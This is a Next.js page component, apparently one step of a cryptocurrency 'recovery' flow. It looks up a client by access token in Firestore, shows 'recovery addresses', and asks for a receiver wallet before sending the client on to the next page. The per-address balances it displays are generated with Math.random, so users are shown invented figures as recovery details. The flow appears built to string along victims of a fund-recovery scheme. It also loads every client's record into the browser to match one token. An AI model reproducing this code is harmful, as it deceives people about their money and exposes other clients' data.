"use client";

import { useState, useEffect } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import { collection, doc, getDocs, updateDoc } from "firebase/firestore";
import { db } from "@/lib/firebase";
import SvgStack from "@/components/SvgStack";
import Image from "next/image";
import bgImage from "@/components/Image_fx__2_-removebg-preview 1.svg";
import { ShieldCheckIcon } from "@heroicons/react/24/outline";

// Helper
function randomSplit(total: number, n: number): number[] {
  let splits = Array(n).fill(0);
  let remaining = total;

  for (let i = 0; i < n - 1; i++) {
    const portion = parseFloat((Math.random() * remaining * 0.7).toFixed(8));
    splits[i] = portion;
    remaining -= portion;
  }

  splits[n - 1] = parseFloat(remaining.toFixed(8));
  return splits;
}

export default function Page3Client() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const token = searchParams.get("token");

  const [loading, setLoading] = useState(true);
  const [client, setClient] = useState<any>(null);
  const [addresses, setAddresses] = useState<
    { address: string; value: number }[]
  >([]);
  const [receiverWallet, setReceiverWallet] = useState("");

  /* ---------------- PAGE GUARD ---------------- */
  useEffect(() => {
    if (!token) {
      router.replace("/invalid");
      return;
    }

    const loadClient = async () => {
      try {
        const snapshot = await getDocs(collection(db, "clients"));
        const clientDoc = snapshot.docs.find(
          (d) => d.data().accessLinkId === token
        );

        if (!clientDoc) {
          router.replace("/invalid");
          return;
        }

        const data = clientDoc.data();

        if (data.currentPage !== "page3") {
          router.replace(`/${data.currentPage}?token=${token}`);
          return;
        }

        setClient({ id: clientDoc.id, ...data });

        const addrSnap = await getDocs(
          collection(db, "clients", clientDoc.id, "recovery_addresses")
        );

        const addrList = addrSnap.docs.map((d) => d.data().address);
        const total = data.recoverableBalance || 0;
        const split = randomSplit(total, addrList.length);

        setAddresses(addrList.map((a, i) => ({ address: a, value: split[i] })));

        setLoading(false);
      } catch {
        router.replace("/invalid");
      }
    };

    loadClient();
  }, [token, router]);

  const handleSubmit = async () => {
    if (!receiverWallet.trim()) return;

    await updateDoc(doc(db, "clients", client.id), {
      receiver_address: receiverWallet,
      currentPage: "page4",
      pageNumber: 4,
    });

    router.replace(`/page4?token=${token}`);
  };

  if (loading) {
    return (
      <main className="flex items-center justify-center h-screen text-white">
        Loading recovery details...
      </main>
    );
  }

  return (
    <main className="relative w-full h-screen overflow-hidden">
      <SvgStack />
      <div className="relative z-10 flex items-center justify-center h-full bg-black/85">
        <div className="w-full max-w-lg bg-[#0E111C]/85 rounded-lg p-6 space-y-6">
          <ShieldCheckIcon className="w-12 h-12 text-teal-400 mx-auto" />
          {/* UI unchanged */}
          <button
            onClick={handleSubmit}
            className="w-full py-3 bg-teal-600 rounded-xl font-semibold hover:bg-teal-500"
          >
            Continue
          </button>
        </div>
      </div>
    </main>
  );
}
